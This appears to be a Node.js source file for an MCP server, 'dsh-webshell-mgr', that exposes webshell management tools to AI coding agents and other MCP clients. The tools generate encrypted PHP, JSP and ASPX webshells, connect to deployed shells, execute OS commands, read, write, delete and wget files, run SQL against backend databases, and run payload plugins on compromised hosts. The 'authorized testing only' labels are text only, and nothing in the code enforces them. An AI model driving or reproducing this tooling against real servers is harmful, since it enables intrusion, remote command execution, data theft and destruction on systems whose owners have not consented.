#!/usr/bin/env node
// dsh-webshell-mgr MCP 服务（stdio / JSON-RPC 2.0，零依赖）：
// 面向外部 harness（claude/codex CLI 或任意 MCP 客户端）暴露与 dsh 会话内模型工具面
// 同一套核心（lib/protocol + lib/store + 生成器 + 插件注册表）。
// dsh 会话内无需本服务——宿主插件的 webshell_* 模型工具即原生通道。
// 挂载：dsh-mcp-studio 添加 stdio 服务（node <本文件>），或任意 mcp.json 配置同命令。
//
// 授权边界：仅授权测试环境使用；操作同样入 op_log 台账（与 UI/工具面同库）。

import path from "node:path";
import os from "node:os";
import readline from "node:readline";
import { openStore, saveConn, listConns, getConn, recordProbe, listDbProfiles, saveDbProfile, recordGeneration, logOp } from "../lib/store.js";
import { detectProtocol } from "../lib/protocol/registry.js";
import * as cap from "../lib/protocol/capabilities.js";
import { GEN_KINDS, makeAndSave } from "../lib/generators.js";
import { listPlugins, getPlugin, runPlugin } from "../lib/plugins-registry.js";

const BASE_DIR = path.join(os.homedir(), ".dsh", "webshell-mgr");
const DB_PATH = path.join(BASE_DIR, "webshell.db");
const store = openStore(DB_PATH);

function connOrThrow(id) {
	const conn = getConn(store, id);
	if (!conn) throw new Error(`连接 ${id} 不存在`);
	return conn;
}

const str = (v) => (v === undefined || v === null ? "" : String(v));

const TOOLS = [
	{
		name: "webshell_generate",
		description: "生成基础/自研加密 webshell 源码（仅授权测试）。kind: php-oneliner/php-basic/php-aes1/php-aes2/jsp-basic/jsp-aes1/aspx-basic/aspx-aes1",
		inputSchema: { type: "object", properties: { kind: { type: "string", enum: Object.keys(GEN_KINDS) }, name: { type: "string" }, password: { type: "string" }, pass_param: { type: "string" }, cmd_param: { type: "string" } }, required: ["kind"] },
		run: (a) => {
			const item = makeAndSave(BASE_DIR, str(a.kind), a);
			recordGeneration(store, { name: item.name, lang: item.lang, kind: item.kind, filePath: item.filePath, meta: { password: item.password } });
			return { filePath: item.filePath, password: item.password, connHint: item.connHint };
		}
	},
	{
		name: "webshell_connect",
		description: "登记并连接 webshell（仅授权测试）：URL+口令(+盐)自动识别协议，探测 OS 与基本信息，返回连接 id",
		inputSchema: { type: "object", properties: { url: { type: "string" }, password: { type: "string" }, secret_key: { type: "string" }, name: { type: "string" }, pass_param: { type: "string" }, cmd_param: { type: "string" } }, required: ["url"] },
		run: async (a) => {
			const result = await detectProtocol({ url: a.url, password: str(a.password), secretKey: str(a.secret_key), passParam: str(a.pass_param) || "pass", cmdParam: str(a.cmd_param) || "cmd", timeoutMs: 8000 });
			if (!result.hit) throw new Error(result.error);
			const existing = listConns(store).find((c) => c.url === str(a.url));
			const saved = saveConn(store, {
				id: existing?.id, name: str(a.name) || existing?.name || new URL(str(a.url)).hostname, url: str(a.url),
				protocol: result.protocol, shell_lang: result.shellLang, exec_mode: result.execMode || "system",
				pass_param: result.protocol.startsWith("cmd") ? (str(a.pass_param) || "pass") : (existing?.pass_param ?? "pass"),
				cmd_param: result.protocol === "cmd-system" ? (str(a.cmd_param) || "cmd") : (existing?.cmd_param ?? "cmd"),
				password: str(a.password), secret_key: str(a.secret_key), os: result.os
			});
			recordProbe(store, saved.id, { status: "ok", basicInfo: result.basicInfo, os: result.os });
			logOp(store, saved.id, "connect", `mcp/${result.protocol}`);
			cap.invalidateConn(saved.id);
			return { id: saved.id, protocol: result.protocol, os: result.os, basicInfo: result.basicInfo };
		}
	},
	{
		name: "webshell_list",
		description: "列出已登记的 webshell 连接",
		inputSchema: { type: "object", properties: {} },
		run: async () => ({ connections: listConns(store).map((c) => ({ id: c.id, name: c.name, url: c.url, protocol: c.protocol, shell_lang: c.shell_lang, os: c.os, last_status: c.last_status })) })
	},
	{
		name: "webshell_exec",
		description: "在 webshell 连接上执行 OS 命令（仅授权测试）",
		inputSchema: { type: "object", properties: { conn_id: { type: "string" }, command: { type: "string" } }, required: ["conn_id", "command"] },
		run: async (a) => {
			const conn = connOrThrow(a.conn_id);
			const output = await cap.runCommand(conn, str(a.command));
			logOp(store, conn.id, "exec", `mcp:${str(a.command).slice(0, 300)}`);
			return { output };
		}
	},
	{
		name: "webshell_file",
		description: "webshell 文件操作（仅授权测试）：ls/read/write/delete/delete-dir/mkdir/mv/chmod/touch/stat/wget/roots",
		inputSchema: { type: "object", properties: { conn_id: { type: "string" }, action: { type: "string", enum: ["ls", "read", "write", "delete", "delete-dir", "mkdir", "mv", "copy", "chmod", "touch", "stat", "wget", "roots"] }, path: { type: "string" }, b64: { type: "string" }, from: { type: "string" }, to: { type: "string" }, url: { type: "string" }, mode: { type: "string" }, epoch: { type: "number" } }, required: ["conn_id", "action"] },
		run: async (a) => {
			const conn = connOrThrow(a.conn_id);
			const action = str(a.action);
			if (action === "ls") return { entries: await cap.listDir(conn, str(a.path)) };
			if (action === "read") {
				const buf = await cap.readFile(conn, str(a.path));
				if (buf.length > 4 * 1024 * 1024) throw new Error("文件过大（>4MB）");
				return { b64: buf.toString("base64"), size: buf.length };
			}
			if (action === "write") return cap.writeFile(conn, str(a.path), Buffer.from(str(a.b64), "base64"));
			logOp(store, conn.id, "file." + action, JSON.stringify({ p: a.path, f: a.from, t: a.to }));
			return cap.fileAction(conn, action, a);
		}
	},
	{
		name: "webshell_db",
		description: "webshell 数据库操作（仅授权测试，需 eval 能力通道）：profile.save/dbs/tables/tableinfo/exec",
		inputSchema: { type: "object", properties: { conn_id: { type: "string" }, action: { type: "string", enum: ["profile.save", "dbs", "tables", "tableinfo", "exec"] }, profile_id: { type: "string" }, type: { type: "string" }, host: { type: "string" }, port: { type: "number" }, username: { type: "string" }, password: { type: "string" }, database: { type: "string" }, table: { type: "string" }, sql: { type: "string" } }, required: ["conn_id", "action"] },
		run: async (a) => {
			const conn = connOrThrow(a.conn_id);
			const action = str(a.action);
			if (action === "profile.save") return { profile: saveDbProfile(store, conn.id, a) };
			const profile = listDbProfiles(store, conn.id).find((x) => x.id === str(a.profile_id));
			if (!profile) throw new Error("数据库档案不存在——先 profile.save");
			if (action === "dbs") return { databases: await cap.dbDatabases(conn, profile) };
			if (action === "tables") return { tables: await cap.dbTables(conn, profile, str(a.database)) };
			if (action === "tableinfo") return cap.dbTableInfo(conn, profile, str(a.database), str(a.table));
			if (action === "exec") return cap.dbQuery(conn, profile, str(a.sql));
			throw new Error(`未知操作 ${action}`);
		}
	},
	{
		name: "webshell_plugin_list",
		description: "列出已安装的 webshell 载荷插件（含参数表）",
		inputSchema: { type: "object", properties: {} },
		run: async () => ({ plugins: listPlugins(path.join(BASE_DIR, "plugins")).map((p) => ({ name: p.name, version: p.version, type: p.type, langs: p.langs, params: p.params })) })
	},
	{
		name: "webshell_plugin_run",
		description: "在 webshell 连接上运行载荷插件（仅授权测试；需 eval 能力通道）",
		inputSchema: { type: "object", properties: { conn_id: { type: "string" }, plugin: { type: "string" }, params_json: { type: "string" } }, required: ["conn_id", "plugin"] },
		run: async (a) => {
			const plugin = getPlugin(path.join(BASE_DIR, "plugins"), str(a.plugin));
			if (!plugin) throw new Error("插件不存在");
			const conn = connOrThrow(a.conn_id);
			let params = {};
			try { params = a.params_json ? JSON.parse(a.params_json) : {}; } catch { throw new Error("params_json 不是合法 JSON"); }
			const result = await runPlugin(conn, plugin, params);
			logOp(store, conn.id, "plugin.run", `mcp:${plugin.name}`);
			return { result };
		}
	}
];

//#region JSON-RPC 2.0 stdio 循环

const rl = readline.createInterface({ input: process.stdin, terminal: false });

function reply(id, result) {
	process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id, result }) + "\n");
}
function replyErr(id, code, message) {
	process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id, error: { code, message } }) + "\n");
}

rl.on("line", (line) => {
	const text = line.trim();
	if (!text) return;
	let msg;
	try { msg = JSON.parse(text); } catch { return; }
	if (msg.id === undefined || msg.id === null) return; // 通知（initialized 等）忽略
	try {
		if (msg.method === "initialize") {
			reply(msg.id, {
				protocolVersion: typeof msg.params?.protocolVersion === "string" ? msg.params.protocolVersion : "2025-06-18",
				capabilities: { tools: {} },
				serverInfo: { name: "dsh-webshell-mgr", version: "1.0.0" }
			});
			return;
		}
		if (msg.method === "ping") { reply(msg.id, {}); return; }
		if (msg.method === "tools/list") {
			reply(msg.id, { tools: TOOLS.map((t) => ({ name: t.name, description: t.description, inputSchema: t.inputSchema })) });
			return;
		}
		if (msg.method === "tools/call") {
			const name = msg.params?.name;
			const tool = TOOLS.find((t) => t.name === name);
			if (!tool) { reply(msg.id, { content: [{ type: "text", text: `未知工具 ${name}` }], isError: true }); return; }
			Promise.resolve()
				.then(() => tool.run(msg.params?.arguments ?? {}))
				.then((result) => reply(msg.id, { content: [{ type: "text", text: JSON.stringify(result, null, 2) }], isError: false }))
				.catch((e) => reply(msg.id, { content: [{ type: "text", text: `执行失败：${e?.message ?? String(e)}` }], isError: true }));
			return;
		}
		replyErr(msg.id, -32601, `method not found: ${msg.method}`);
	} catch (e) {
		replyErr(msg.id, -32603, String(e?.message ?? e));
	}
});

process.on("uncaughtException", (e) => {
	process.stderr.write(`[dsh-webshell-mgr mcp] ${e?.stack ?? e}\n`);
});

//#endregion
